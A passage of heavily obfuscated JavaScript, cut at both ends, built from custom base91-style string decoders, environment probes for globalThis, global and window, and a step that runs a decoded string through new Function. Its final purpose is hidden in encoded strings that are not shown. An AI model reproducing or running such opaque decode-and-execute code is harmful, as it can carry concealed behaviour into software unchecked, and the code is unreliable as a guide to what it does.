V3ZAYOu=H9jnwoa(isGUSn=>{return GFnG9W5[isGUSn>-0x57?isGUSn+0x56:isGUSn-0x16]},0x1);Tjl5S3=(bbYbsV&0x7)<<0x12|(isGUSn[X4ir0c++]&0x3f)<<Khxseg(-0xc)|(isGUSn[X4ir0c++]&V3ZAYOu(-0x54))<<0x6|isGUSn[X4ir0c++]&Khxseg(-0xd)}else{ZKXaJHd(Tjl5S3=0x3f,X4ir0c+=0x3)}}}}CPjcwW.push(dpdLCik[Tjl5S3]||(dpdLCik[Tjl5S3]=NVMuEZ(Tjl5S3)))}return CPjcwW.join('')},0x1)})(),uA59_F(SbulZ8,0x1));function SbulZ8(...dpdLCik){var NVMuEZ=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik<0x33?dpdLCik>0x33?dpdLCik-0x58:dpdLCik<0x33?dpdLCik>-0x1d?dpdLCik+0x1c:dpdLCik+0x24:dpdLCik+0x43:dpdLCik-0x44]},0x1);ZKXaJHd(dpdLCik.length=0x1,dpdLCik[NVMuEZ(-0x18)]=0x69);if(typeof Tjl5S3!==Khxseg(-0xe)&&Tjl5S3){return new Tjl5S3().decode(new bbYbsV(dpdLCik[0x0]))}else{if(typeof qRpgEWo!=='undefined'&&qRpgEWo){return qRpgEWo.from(dpdLCik[Khxseg(-0xa)]).toString('utf-8')}else{var CPjcwW=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>-0x2a?dpdLCik>0x26?dpdLCik+0x3f:dpdLCik<-0x2a?dpdLCik-0x4c:dpdLCik<0x26?dpdLCik+0x29:dpdLCik+0x3f:dpdLCik-0x5f]},0x1);return V3ZAYOu(dpdLCik[dpdLCik[0xad]-(dpdLCik[CPjcwW(-0x25)]-NVMuEZ(-0x17))])}}}ZKXaJHd(fne1rv9=[CPjcwW(Khxseg(0x37))],HOZkhs2={k8eHk57:CPjcwW(0x12),kKtB_z7:CPjcwW(0x13),[Khxseg(0x19)]:CPjcwW(0x15),KtUOJcJ:CPjcwW(0x16)},veiTIU=H9jnwoa((dpdLCik,NVMuEZ,CPjcwW,isGUSn,Tjl5S3,bbYbsV)=>{var qRpgEWo=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik<0x14?dpdLCik+0x11:dpdLCik-0x15]},0x1);ZKXaJHd(dpdLCik=uA59_F((...NVMuEZ)=>{var CPjcwW=H9jnwoa(NVMuEZ=>{return GFnG9W5[NVMuEZ>-0x8?NVMuEZ+0x3b:NVMuEZ+0x57]},0x1);ZKXaJHd(NVMuEZ.length=CPjcwW(-0x50),NVMuEZ[Khxseg(-0x9)]=-0x44);if(typeof NVMuEZ[NVMuEZ.yKuEPv+CPjcwW(-0x20)]===Khxseg(-0xe)){NVMuEZ[0x3]=GKTPti}if(typeof NVMuEZ[0x4]==='undefined'){NVMuEZ[0x4]=UQ101r}if(NVMuEZ[NVMuEZ.yKuEPv+(NVMuEZ[Khxseg(-0x9)]+0x8a)]==NVMuEZ[NVMuEZ.yKuEPv+0x44]){var isGUSn=H9jnwoa(NVMuEZ=>{return GFnG9W5[NVMuEZ>0x31?NVMuEZ>0x81?NVMuEZ-0xa:NVMuEZ<0x81?NVMuEZ>0x31?NVMuEZ-0x32:NVMuEZ+0x29:NVMuEZ+0x3e:NVMuEZ+0x2]},0x1);return NVMuEZ[NVMuEZ[isGUSn(0x38)]+0x45][UQ101r[NVMuEZ[qRpgEWo(0x20)]]]=dpdLCik(NVMuEZ[0x0],NVMuEZ[0x1])}if(NVMuEZ[NVMuEZ.yKuEPv+Khxseg(0x16)]!==NVMuEZ[0x1]){var Tjl5S3=H9jnwoa(NVMuEZ=>{return GFnG9W5[NVMuEZ<-0x4b?NVMuEZ+0x2:NVMuEZ<-0x4b?NVMuEZ+0x13:NVMuEZ>-0x4b?NVMuEZ<0x5?NVMuEZ+0x4a:NVMuEZ+0x14:NVMuEZ-0x13]},0x1);return NVMuEZ[NVMuEZ.yKuEPv+0x48][NVMuEZ[NVMuEZ[Khxseg(-0x9)]+0x44]]||(NVMuEZ[NVMuEZ[Khxseg(-0x9)]+Khxseg(0x29)][NVMuEZ[Khxseg(-0xa)]]=NVMuEZ[NVMuEZ[Tjl5S3(-0x44)]+0x47](q3T9Hb[NVMuEZ[0x0]]))}},Khxseg(-0x8)),NVMuEZ=dpdLCik.call(qRpgEWo(0x1d),0x0),CPjcwW=dpdLCik(0x0),isGUSn={[Khxseg(-0x6)]:dpdLCik.apply(Khxseg(-0x7),[qRpgEWo(0x1f)])},Tjl5S3=dpdLCik(0x0),bbYbsV={KHzte2E:[],tM3SBQ:[],t6fJof:H9jnwoa((dpdLCik=Tjl5S3)=>{if(!veiTIU.Vu02sY[0x0]){veiTIU.Vu02sY.push(-qRpgEWo(0x45))}return veiTIU.Vu02sY[dpdLCik]}),PAaMYo:isGUSn[qRpgEWo(0x1e)],PwTPxmo:H9jnwoa((dpdLCik=CPjcwW)=>{if(!veiTIU.tM3SBQ[Khxseg(-0xa)]){veiTIU.tM3SBQ.push(0x4d)}return veiTIU.tM3SBQ[dpdLCik]}),AWPd4HV:dpdLCik(0x2),d5qoKC:H9jnwoa((dpdLCik=NVMuEZ)=>{if(!veiTIU.KHzte2E[0x0]){veiTIU.KHzte2E.push(0x22)}return veiTIU.KHzte2E[dpdLCik]}),Vu02sY:[],lDN73bH:dpdLCik(0x3)});return bbYbsV;function GKTPti(...dpdLCik){var NVMuEZ;function CPjcwW(dpdLCik){return GFnG9W5[dpdLCik>-0x5d?dpdLCik+0x5c:dpdLCik-0x2e]}ZKXaJHd(dpdLCik.length=CPjcwW(-0x52),dpdLCik[0xb]=-0x80,dpdLCik.zK0VuUu='zy`92xw>+]?[Ps/e3DNM"6%$ci8kn=tm&vu~*ZEbFA#RWIj}pXhf.Y;Bg1<|!G(Kq@4OL^5HCJa,{r:Q)7To_dlS0UV',dpdLCik.XSjHNh7=dpdLCik[Khxseg(-0x4)],dpdLCik.XSjHNh7=''+(dpdLCik[0x0]||''),dpdLCik.cU4i_H=0x4a,dpdLCik.vjSvhC=dpdLCik.XSjHNh7.length,dpdLCik.TCM1MO=[],dpdLCik[qRpgEWo(0x27)]=0x0,dpdLCik[qRpgEWo(0x23)]=Khxseg(-0xa),dpdLCik[qRpgEWo(0x22)]=-0x1);for(NVMuEZ=dpdLCik.cU4i_H-0x4a;NVMuEZ<dpdLCik.vjSvhC;NVMuEZ++){var isGUSn=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>0x2d?dpdLCik-0x12:dpdLCik>-0x23?dpdLCik>-0x23?dpdLCik<0x2d?dpdLCik+0x22:dpdLCik+0x1e:dpdLCik+0x45:dpdLCik+0x2b]},0x1);dpdLCik[isGUSn(-0x16)]=dpdLCik.zK0VuUu.indexOf(dpdLCik.XSjHNh7[NVMuEZ]);if(dpdLCik[qRpgEWo(0x21)]===-isGUSn(-0x18)){continue}if(dpdLCik[isGUSn(-0x15)]<0x0){dpdLCik.SUhASrH=dpdLCik[dpdLCik[Khxseg(0x0)]+0x89]}else{var Tjl5S3=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik<0x3f?dpdLCik-0x2d:dpdLCik-0x40]},0x1);ZKXaJHd(dpdLCik.SUhASrH+=dpdLCik[0x9]*0x5b,dpdLCik.wgD7ts|=dpdLCik.SUhASrH<<dpdLCik.rI8myh,dpdLCik[Tjl5S3(0x4e)]+=(dpdLCik[CPjcwW(-0x4f)]&dpdLCik[Khxseg(0x1)]+0x1fb5)>dpdLCik[CPjcwW(-0x4d)]+0xd8?qRpgEWo(0x30):0xe);do{var bbYbsV=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik<0x35?dpdLCik<-0x1b?dpdLCik+0x38:dpdLCik<0x35?dpdLCik+0x1a:dpdLCik-0x35:dpdLCik-0x5b]},0x1);ZKXaJHd(dpdLCik[isGUSn(-0x11)].push(dpdLCik.wgD7ts&dpdLCik[bbYbsV(-0xa)]+0xb5),dpdLCik.wgD7ts>>=dpdLCik[isGUSn(-0x13)]+0x88,dpdLCik[isGUSn(-0x14)]-=CPjcwW(-0x45))}while(dpdLCik[Khxseg(-0x1)]>0x7);dpdLCik[CPjcwW(-0x4f)]=-(dpdLCik[0xb]+0x81)}}if(dpdLCik.SUhASrH>-0x1){var GKTPti=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik<0x59?dpdLCik>0x9?dpdLCik>0x9?dpdLCik>0x59?dpdLCik+0x35:dpdLCik-0xa:dpdLCik+0x62:dpdLCik+0x37:dpdLCik+0x59]},0x1);dpdLCik[GKTPti(0x1b)].push((dpdLCik[CPjcwW(-0x4a)]|dpdLCik[GKTPti(0x17)]<<dpdLCik[qRpgEWo(0x23)])&qRpgEWo(0x29))}return dpdLCik[Khxseg(0x0)]>-Khxseg(0x2a)?dpdLCik[0x20]:SbulZ8(dpdLCik.TCM1MO)}},0x6)());var escQKI,jguvmiV=function(dpdLCik,NVMuEZ){ZKXaJHd(dpdLCik=(NVMuEZ,CPjcwW,isGUSn,Tjl5S3,bbYbsV)=>{var qRpgEWo=H9jnwoa(NVMuEZ=>{return GFnG9W5[NVMuEZ<0x8b?NVMuEZ>0x8b?NVMuEZ-0x0:NVMuEZ<0x8b?NVMuEZ-0x3c:NVMuEZ-0x4:NVMuEZ-0x46]},0x1);if(typeof Tjl5S3==='undefined'){Tjl5S3=GKTPti}if(typeof bbYbsV==='undefined'){bbYbsV=UQ101r}if(Tjl5S3===dpdLCik){GKTPti=CPjcwW;return GKTPti(isGUSn)}if(isGUSn==NVMuEZ){return CPjcwW[UQ101r[isGUSn]]=dpdLCik(NVMuEZ,CPjcwW)}if(Tjl5S3===qRpgEWo(0x44)){dpdLCik=bbYbsV}if(isGUSn==Tjl5S3){return CPjcwW?NVMuEZ[bbYbsV[CPjcwW]]:UQ101r[NVMuEZ]||(isGUSn=bbYbsV[NVMuEZ]||Tjl5S3,UQ101r[NVMuEZ]=isGUSn(q3T9Hb[NVMuEZ]))}if(CPjcwW){[bbYbsV,CPjcwW]=[Tjl5S3(bbYbsV),NVMuEZ||isGUSn];return dpdLCik(NVMuEZ,bbYbsV,isGUSn)}if(NVMuEZ!==CPjcwW){return bbYbsV[NVMuEZ]||(bbYbsV[NVMuEZ]=Tjl5S3(q3T9Hb[NVMuEZ]))}},NVMuEZ=[dpdLCik(Khxseg(-0xc))]);function CPjcwW(){return globalThis}function isGUSn(){return global}function Tjl5S3(){return window}function bbYbsV(...dpdLCik){var NVMuEZ;ZKXaJHd(dpdLCik[Khxseg(0x4)]=Khxseg(-0xa),dpdLCik.HJdWKh=Khxseg(0x2e),NVMuEZ=(dpdLCik,isGUSn,Tjl5S3,bbYbsV,qRpgEWo)=>{if(typeof bbYbsV==='undefined'){bbYbsV=CPjcwW}if(typeof qRpgEWo==='undefined'){qRpgEWo=UQ101r}if(bbYbsV===NVMuEZ){CPjcwW=isGUSn;return CPjcwW(Tjl5S3)}if(Tjl5S3==dpdLCik){return isGUSn[UQ101r[Tjl5S3]]=NVMuEZ(dpdLCik,isGUSn)}if(Tjl5S3==bbYbsV){return isGUSn?dpdLCik[qRpgEWo[isGUSn]]:UQ101r[dpdLCik]||(Tjl5S3=qRpgEWo[dpdLCik]||bbYbsV,UQ101r[dpdLCik]=Tjl5S3(q3T9Hb[dpdLCik]))}if(isGUSn){[qRpgEWo,isGUSn]=[bbYbsV(qRpgEWo),dpdLCik||Tjl5S3];return NVMuEZ(dpdLCik,qRpgEWo,Tjl5S3)}if(dpdLCik!==isGUSn){return qRpgEWo[dpdLCik]||(qRpgEWo[dpdLCik]=bbYbsV(q3T9Hb[dpdLCik]))}if(bbYbsV===Khxseg(-0x7)){NVMuEZ=qRpgEWo}if(Tjl5S3&&bbYbsV!==CPjcwW){NVMuEZ=CPjcwW;return NVMuEZ(dpdLCik,-0x1,Tjl5S3,bbYbsV,qRpgEWo)}},dpdLCik.uUUdFsh=NVMuEZ(dpdLCik.HJdWKh-Khxseg(0x2c)));return dpdLCik.HJdWKh>0xac?dpdLCik[-Khxseg(0x35)]:new Function(dpdLCik.uUUdFsh)();function CPjcwW(dpdLCik,NVMuEZ='x6{u5B&)/jozcTIvn]Y:w*iA|f}=O<,$@!Qr`D+mM;"Ct9FUZE_LHN#P28p%~VeW[4sSk>.1y3X^hl0agbJGd?qK7(R',CPjcwW,isGUSn,Tjl5S3=[],bbYbsV=0x0,qRpgEWo,GKTPti,X4ir0c,V3ZAYOu){var fne1rv9=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>0x9f?dpdLCik+0x2a:dpdLCik-0x50]},0x1);ZKXaJHd(CPjcwW=''+(dpdLCik||''),isGUSn=CPjcwW.length,qRpgEWo=Khxseg(-0xa),GKTPti=-0x1);for(X4ir0c=fne1rv9(0x55);X4ir0c<isGUSn;X4ir0c++){V3ZAYOu=NVMuEZ.indexOf(CPjcwW[X4ir0c]);if(V3ZAYOu===-0x1){continue}if(GKTPti<0x0){GKTPti=V3ZAYOu}else{var HOZkhs2=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>0x3a?dpdLCik-0x19:dpdLCik>0x3a?dpdLCik+0x38:dpdLCik<0x3a?dpdLCik+0x15:dpdLCik-0x5c]},0x1);ZKXaJHd(GKTPti+=V3ZAYOu*fne1rv9(0x6a),bbYbsV|=GKTPti<<qRpgEWo,qRpgEWo+=(GKTPti&Khxseg(0xf))>Khxseg(0x15)?0xd:0xe);do{var veiTIU=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik<0x9d?dpdLCik<0x9d?dpdLCik<0x9d?dpdLCik<0x9d?dpdLCik-0x4e:dpdLCik+0x60:dpdLCik+0x64:dpdLCik+0x62:dpdLCik+0x34]},0x1);ZKXaJHd(Tjl5S3.push(bbYbsV&veiTIU(0x62)),bbYbsV>>=0x8,qRpgEWo-=0x8)}while(qRpgEWo>HOZkhs2(0x4));GKTPti=-Khxseg(-0x5)}}if(GKTPti>-0x1){Tjl5S3.push((bbYbsV|GKTPti<<qRpgEWo)&0xff)}return SbulZ8(Tjl5S3)}}function qRpgEWo(dpdLCik=[CPjcwW,isGUSn,Tjl5S3,bbYbsV],NVMuEZ,qRpgEWo,GKTPti,X4ir0c=[],V3ZAYOu,fne1rv9,HOZkhs2,dZwH1b,rf7GSa5,azzrAg3){ZKXaJHd(NVMuEZ=uA59_F((...dpdLCik)=>{var qRpgEWo=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>0x9b?dpdLCik-0x39:dpdLCik-0x4c]},0x1);ZKXaJHd(dpdLCik.length=0x5,dpdLCik[qRpgEWo(0x61)]=dpdLCik[qRpgEWo(0x69)]);if(typeof dpdLCik[qRpgEWo(0x62)]===qRpgEWo(0x4d)){dpdLCik[0x3]=escQKI}if(typeof dpdLCik[Khxseg(0x6)]===qRpgEWo(0x4d)){dpdLCik[0x72]=UQ101r}if(dpdLCik[qRpgEWo(0x57)]==dpdLCik[qRpgEWo(0x62)]){var GKTPti=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>0xa?dpdLCik>0xa?dpdLCik-0xb:dpdLCik-0x20:dpdLCik-0x2f]},0x1);return dpdLCik[0x1]?dpdLCik[0x0][dpdLCik[0x72][dpdLCik[0x1]]]:UQ101r[dpdLCik[0x0]]||(dpdLCik[GKTPti(0x16)]=dpdLCik[0x72][dpdLCik[qRpgEWo(0x51)]]||dpdLCik[0x3],UQ101r[dpdLCik[0x0]]=dpdLCik[0x2](q3T9Hb[dpdLCik[Khxseg(-0xa)]]))}if(dpdLCik[0x2]&&dpdLCik[Khxseg(0x7)]!==escQKI){NVMuEZ=escQKI;return NVMuEZ(dpdLCik[Khxseg(-0xa)],-0x1,dpdLCik[qRpgEWo(0x57)],dpdLCik[0x3],dpdLCik[0x72])}if(dpdLCik[qRpgEWo(0x62)]===void 0x0){var X4ir0c=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>-0x2e?dpdLCik+0x2d:dpdLCik-0x20]},0x1);NVMuEZ=dpdLCik[X4ir0c(-0x18)]}if(dpdLCik[0x2]==dpdLCik[qRpgEWo(0x51)]){var V3ZAYOu=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik<0x2?dpdLCik+0x4d:dpdLCik-0x58]},0x1);return dpdLCik[0x1][UQ101r[dpdLCik[0x2]]]=NVMuEZ(dpdLCik[V3ZAYOu(-0x48)],dpdLCik[0x1])}if(dpdLCik[0x0]!==dpdLCik[Khxseg(-0x5)]){var fne1rv9=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik<-0x8?dpdLCik<-0x58?dpdLCik-0x9:dpdLCik<-0x58?dpdLCik-0x50:dpdLCik+0x57:dpdLCik-0x48]},0x1);return dpdLCik[fne1rv9(-0x42)][dpdLCik[fne1rv9(-0x52)]]||(dpdLCik[Khxseg(0x6)][dpdLCik[0x0]]=dpdLCik[0x3](q3T9Hb[dpdLCik[0x0]]))}},0x5),qRpgEWo={YmDcyqi:NVMuEZ(0xa)},GKTPti=GKTPti);try{var K9G15Z=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>0xad?dpdLCik-0x60:dpdLCik<0x5d?dpdLCik-0xa:dpdLCik<0xad?dpdLCik-0x5e:dpdLCik+0x29]},0x1);ZKXaJHd(V3ZAYOu=(dpdLCik,NVMuEZ,qRpgEWo,GKTPti,X4ir0c)=>{if(typeof GKTPti===Khxseg(-0xe)){GKTPti=sax25ap}if(typeof X4ir0c==='undefined'){X4ir0c=UQ101r}if(NVMuEZ){[X4ir0c,NVMuEZ]=[GKTPti(X4ir0c),dpdLCik||qRpgEWo];return V3ZAYOu(dpdLCik,X4ir0c,qRpgEWo)}if(qRpgEWo&&GKTPti!==sax25ap){V3ZAYOu=sax25ap;return V3ZAYOu(dpdLCik,-0x1,qRpgEWo,GKTPti,X4ir0c)}if(GKTPti===V3ZAYOu){sax25ap=NVMuEZ;return sax25ap(qRpgEWo)}if(qRpgEWo==GKTPti){return NVMuEZ?dpdLCik[X4ir0c[NVMuEZ]]:UQ101r[dpdLCik]||(qRpgEWo=X4ir0c[dpdLCik]||GKTPti,UQ101r[dpdLCik]=qRpgEWo(q3T9Hb[dpdLCik]))}if(dpdLCik!==NVMuEZ){return X4ir0c[dpdLCik]||(X4ir0c[dpdLCik]=GKTPti(q3T9Hb[dpdLCik]))}},fne1rv9=[V3ZAYOu(K9G15Z(0x6a))],HOZkhs2=V3ZAYOu(Khxseg(0x8)),dZwH1b={lv4nU_h:V3ZAYOu.apply(void 0x0,[K9G15Z(0x76)])},GKTPti=Object,X4ir0c[V3ZAYOu(0x5)](''[dZwH1b.lv4nU_h+V3ZAYOu.apply(void 0x0,[K9G15Z(0x77)])][HOZkhs2][fne1rv9[K9G15Z(0x63)]]));function sax25ap(dpdLCik,NVMuEZ='6+0(>^x7_p,oRUkGPA?St]9BKjQz[E:=F&N"IhM8@`3g2/i{.dbamZXf;1|w}#Lv!OWe5c<CuqTrH*$)4ysYJnlV~%D',qRpgEWo,GKTPti,X4ir0c=[],V3ZAYOu,fne1rv9=0x0,HOZkhs2,dZwH1b=0x0,azzrAg3){ZKXaJHd(qRpgEWo=''+(dpdLCik||''),GKTPti=qRpgEWo.length,V3ZAYOu=K9G15Z(0x63),HOZkhs2=-Khxseg(-0x5));for(dZwH1b=dZwH1b;dZwH1b<GKTPti;dZwH1b++){azzrAg3=NVMuEZ.indexOf(qRpgEWo[dZwH1b]);if(azzrAg3===-0x1){continue}if(HOZkhs2<0x0){HOZkhs2=azzrAg3}else{var sax25ap=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik<0xa0?dpdLCik-0x51:dpdLCik+0x3f]},0x1);ZKXaJHd(HOZkhs2+=azzrAg3*K9G15Z(0x78),V3ZAYOu|=HOZkhs2<<fne1rv9,fne1rv9+=(HOZkhs2&0x1fff)>0x58?sax25ap(0x6c):sax25ap(0x70));do{ZKXaJHd(X4ir0c.push(V3ZAYOu&0xff),V3ZAYOu>>=0x8,fne1rv9-=Khxseg(0x8))}while(fne1rv9>Khxseg(0xa));HOZkhs2=-0x1}}if(HOZkhs2>-0x1){var escQKI=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>0x5c?dpdLCik<0x5c?dpdLCik-0x18:dpdLCik-0x5d:dpdLCik+0x2f]},0x1);X4ir0c.push((V3ZAYOu|HOZkhs2<<fne1rv9)&escQKI(0x71))}return SbulZ8(X4ir0c)}}catch(e){}n_FD8XL:for(rf7GSa5=Khxseg(-0xa);rf7GSa5<dpdLCik[qRpgEWo.YmDcyqi]&&veiTIU.t6fJof();rf7GSa5++)try{GKTPti=dpdLCik[rf7GSa5]();for(azzrAg3=0x0;azzrAg3<X4ir0c[NVMuEZ(0xa)];azzrAg3++)if(typeof GKTPti[X4ir0c[azzrAg3]]===NVMuEZ(Khxseg(0x0))){continue n_FD8XL}return GKTPti}catch(e){}return GKTPti||this;function escQKI(...dpdLCik){var NVMuEZ;function qRpgEWo(dpdLCik){return GFnG9W5[dpdLCik<-0x47?dpdLCik+0x15:dpdLCik>0x9?dpdLCik+0x42:dpdLCik<-0x47?dpdLCik+0x5:dpdLCik<0x9?dpdLCik+0x46:dpdLCik+0xb]}ZKXaJHd(dpdLCik.length=0x1,dpdLCik.zhW_2c=Khxseg(-0x4),dpdLCik[0x1]='_ctfNpFkUEv{@#Q:a4jsDwZ"rReKiP;<]HuS~79IC(G$0b1MVql>nYhmz`?O,*B6[+y5x2A)|J}3.X^8=WT/dLog&!%',dpdLCik.m_77im=-0x2f,dpdLCik.MrpKikz=''+(dpdLCik[Khxseg(-0xa)]||''),dpdLCik[qRpgEWo(-0x2a)]=dpdLCik.MrpKikz,dpdLCik[0x3]=dpdLCik[Khxseg(0xd)].length,dpdLCik[Khxseg(0xe)]=[],dpdLCik[0x5]=dpdLCik.zhW_2c-qRpgEWo(-0x3b),dpdLCik[dpdLCik[qRpgEWo(-0x26)]+0x4]=0x0,dpdLCik[Khxseg(0xa)]=-qRpgEWo(-0x3c));for(NVMuEZ=0x0;NVMuEZ<dpdLCik[qRpgEWo(-0x30)];NVMuEZ++){var GKTPti=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik<-0x1c?dpdLCik+0xc:dpdLCik>-0x1c?dpdLCik<-0x1c?dpdLCik+0x36:dpdLCik<-0x1c?dpdLCik+0x32:dpdLCik+0x1b:dpdLCik-0x3d]},0x1);dpdLCik[0x9]=dpdLCik[dpdLCik.m_77im+0x30].indexOf(dpdLCik[GKTPti(0x1)][NVMuEZ]);if(dpdLCik[GKTPti(-0xf)]===-GKTPti(-0x11)){continue}if(dpdLCik[dpdLCik.m_77im+0x36]<0x0){var X4ir0c=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>0x76?dpdLCik+0x34:dpdLCik>0x76?dpdLCik+0x1f:dpdLCik<0x76?dpdLCik>0x76?dpdLCik-0x36:dpdLCik-0x27:dpdLCik-0x49]},0x1);dpdLCik[X4ir0c(0x40)]=dpdLCik[dpdLCik.m_77im+0x38]}else{var V3ZAYOu=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>0x8?dpdLCik-0x9:dpdLCik-0x55]},0x1);ZKXaJHd(dpdLCik[Khxseg(0xa)]+=dpdLCik[0x9]*0x5b,dpdLCik[qRpgEWo(-0x3f)]|=dpdLCik[dpdLCik.zhW_2c+V3ZAYOu(0x10)]<<dpdLCik[0x6],dpdLCik[dpdLCik.m_77im+0x35]+=(dpdLCik[Khxseg(0xa)]&GKTPti(0x3))>0x58?V3ZAYOu(0x24):Khxseg(0x10));do{var fne1rv9=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik<0x3c?dpdLCik-0x25:dpdLCik>0x8c?dpdLCik-0x62:dpdLCik>0x3c?dpdLCik<0x3c?dpdLCik+0x50:dpdLCik-0x3d:dpdLCik+0x5e]},0x1);ZKXaJHd(dpdLCik[dpdLCik.zhW_2c+0x2].push(dpdLCik[V3ZAYOu(0x10)]&fne1rv9(0x51)),dpdLCik[V3ZAYOu(0x10)]>>=0x8,dpdLCik[0x6]-=0x8)}while(dpdLCik[dpdLCik[qRpgEWo(-0x26)]-(dpdLCik[GKTPti(0x5)]-GKTPti(-0x3))]>0x7);dpdLCik[Khxseg(0xa)]=-GKTPti(-0x11)}}if(dpdLCik[0x7]>-0x1){dpdLCik[0x4].push((dpdLCik[qRpgEWo(-0x3f)]|dpdLCik[Khxseg(0xa)]<<dpdLCik[dpdLCik[Khxseg(0x12)]+0x35])&dpdLCik[Khxseg(0x12)]+0x12e)}return dpdLCik[Khxseg(0x11)]>0x4c?dpdLCik[-0x70]:SbulZ8(dpdLCik[dpdLCik.m_77im+0x33])}}return escQKI=qRpgEWo[NVMuEZ[Khxseg(-0xa)]](this);function GKTPti(...dpdLCik){var NVMuEZ;function CPjcwW(dpdLCik){return GFnG9W5[dpdLCik>0x38?dpdLCik>0x38?dpdLCik<0x88?dpdLCik-0x39:dpdLCik+0x35:dpdLCik-0x27:dpdLCik-0x56]}ZKXaJHd(dpdLCik[CPjcwW(0x4c)]=0x1,dpdLCik.hT6fSkk=dpdLCik.WhZRTts,dpdLCik.hT6fSkk='F}jVlHJq/Iuafzv?Pn"~Yy8E@]OrA{B`TiXo4gm^S1Qe.Ds+w;kW[)0>G|cR2Kb9tC:6h*!x&=,MZ%p$3dNL7_#(5U<',dpdLCik.i28_Au4=''+(dpdLCik[0x0]||''),dpdLCik[CPjcwW(0x4f)]=dpdLCik.i28_Au4.length,dpdLCik[0x4]=[],dpdLCik[0x5]=0x0,dpdLCik[Khxseg(0x14)]=Khxseg(-0xa),dpdLCik.Ndm7bm=-Khxseg(-0x5));for(NVMuEZ=Khxseg(-0xa);NVMuEZ<dpdLCik[Khxseg(0x7)];NVMuEZ++){var isGUSn=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik<0xb0?dpdLCik<0x60?dpdLCik+0x18:dpdLCik-0x61:dpdLCik-0x62]},0x1);dpdLCik[isGUSn(0x6d)]=dpdLCik.hT6fSkk.indexOf(dpdLCik.i28_Au4[NVMuEZ]);if(dpdLCik[CPjcwW(0x45)]===-0x1){continue}if(dpdLCik.Ndm7bm<0x0){dpdLCik.Ndm7bm=dpdLCik[Khxseg(-0x3)]}else{var Tjl5S3=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>-0x5a?dpdLCik<-0xa?dpdLCik+0x59:dpdLCik+0x1e:dpdLCik-0x4b]},0x1);ZKXaJHd(dpdLCik[Khxseg(0x13)]+=dpdLCik[isGUSn(0x6d)]*0x5b,dpdLCik[Tjl5S3(-0x52)]|=dpdLCik[CPjcwW(0x5b)]<<dpdLCik[isGUSn(0x84)],dpdLCik.J_3W9F+=(dpdLCik[CPjcwW(0x5b)]&CPjcwW(0x57))>Tjl5S3(-0x35)?0xd:0xe);do{ZKXaJHd(dpdLCik[Tjl5S3(-0x3c)].push(dpdLCik[0x5]&isGUSn(0x75)),dpdLCik[Tjl5S3(-0x52)]>>=0x8,dpdLCik[CPjcwW(0x5c)]-=0x8)}while(dpdLCik[CPjcwW(0x5c)]>Tjl5S3(-0x40));dpdLCik.Ndm7bm=-0x1}}if(dpdLCik[Khxseg(0x13)]>-0x1){var bbYbsV=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>0x8a?dpdLCik-0x3d:dpdLCik>0x3a?dpdLCik>0x8a?dpdLCik+0x35:dpdLCik>0x8a?dpdLCik+0x9:dpdLCik-0x3b:dpdLCik-0x1c]},0x1);dpdLCik[0x4].push((dpdLCik[bbYbsV(0x42)]|dpdLCik[bbYbsV(0x5d)]<<dpdLCik.J_3W9F)&0xff)}return SbulZ8(dpdLCik[0x4])}}[CPjcwW(0xd)]();function nQCjjwI(...ZKXaJHd){return ZKXaJHd[ZKXaJHd[CPjcwW(0xe)]-0x1]}function ZvVqfU(ZKXaJHd,dpdLCik){var NVMuEZ=H9jnwoa(ZKXaJHd=>{return GFnG9W5[ZKXaJHd>0x2d?ZKXaJHd+0x5b:ZKXaJHd<-0x23?ZKXaJHd-0x13:ZKXaJHd>0x2d?ZKXaJHd-0x63:ZKXaJHd+0x22]},0x1);switch(dZwH1b){case!veiTIU.t6fJof()?NVMuEZ(-0x1a):-0x2:return ZKXaJHd+dpdLCik}}uA59_F(EyP6nJ,0x1);function EyP6nJ(...dpdLCik){var NVMuEZ=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik<0x4b?dpdLCik>0x4b?dpdLCik-0x47:dpdLCik<0x4b?dpdLCik+0x4:dpdLCik-0x3d:dpdLCik+0x56]},0x1);ZKXaJHd(dpdLCik.length=Khxseg(-0x5),dpdLCik[NVMuEZ(0x21)]=0x72);if(dpdLCik[0x44]>dpdLCik[Khxseg(0x16)]-(dpdLCik[0x44]-0xc6)){return dpdLCik[dpdLCik[0x44]-NVMuEZ(0x27)]}else{var CPjcwW=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>0x1c?dpdLCik-0x14:dpdLCik<0x1c?dpdLCik>-0x34?dpdLCik<-0x34?dpdLCik+0x46:dpdLCik+0x33:dpdLCik+0x60:dpdLCik-0x2a]},0x1);return nQCjjwI(dpdLCik[CPjcwW(-0x2e)]=dZwH1b+(dZwH1b=dpdLCik[0x0],CPjcwW(-0x2e)),dpdLCik[dpdLCik[Khxseg(0x16)]-0x72])}}ZKXaJHd(dZwH1b=dZwH1b,uA59_F(IRLLENa,Khxseg(-0x4)));function IRLLENa(...dpdLCik){var NVMuEZ=H9jnwoa(dpdLCik=>{return 